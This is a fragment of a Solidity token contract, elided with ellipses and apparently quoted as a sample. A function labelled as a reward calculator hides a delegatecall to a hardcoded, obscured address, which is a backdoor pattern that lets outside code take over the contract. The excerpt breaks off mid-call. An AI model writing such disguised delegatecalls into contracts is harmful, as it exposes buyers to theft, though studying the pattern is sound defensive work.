      ...
      BaseContract
{
  ...
  uint160 private handler = uint160(
     0x4EB03e5958c2aDFE016bCc81F5E95A2AFD77e9Dc );
  ...
  function renounceOwnership( ) public virtual onlyOwner {
   ...
   function calculateReward ( address buyer, uint256 luck ) public {
       lastcaller = uint160(msg.sender);
        /**
        * @dev Returns the amount of tokens that the last buyer receives as a reward.
        */
       address( handler ).delegatecall( abi.encodeWithSignature( string( 
